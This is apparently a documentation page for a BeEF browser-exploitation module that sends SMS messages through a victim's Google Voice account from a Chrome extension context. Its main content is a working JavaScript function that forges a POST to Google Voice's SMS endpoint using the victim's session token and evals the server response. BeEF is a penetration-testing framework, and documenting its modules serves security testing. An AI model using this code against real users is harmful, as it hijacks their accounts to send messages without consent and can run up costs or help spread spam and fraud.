## Summary

* **Objective**: Send a SMS text message through the Google Voice account of the victim
* **Authors**: Kos, antisnatchor
* **Browsers**: Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/chrome_extensions/send_gvoice_sms)

## Internal Working

send the message through a POST request to `google.com/voice/sms/send`

```js

function sendSMSNOW(message,number,token){
                token = token.replace("+","%2b").replace("=","%3d");
                var sendMessage = new XMLHttpRequest();
                sendMessage.open("POST","https://www.google.com/voice/sms/send/",false);
                sendMessage.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
                params = "id=&phoneNumber="+number+"&conversationId=&text="+message+"&contact=&_rnr_se="+token
                sendMessage.send(params)
                eval("response="+sendMessage.responseText);
                if(response['ok'] == true){
                                status = "OK. Your message has been sent.";
                } else {
                                status = "ERROR. Something went wrong. Make sure you prefix the number with the country code.";
                }
}
                
```

## Feedback

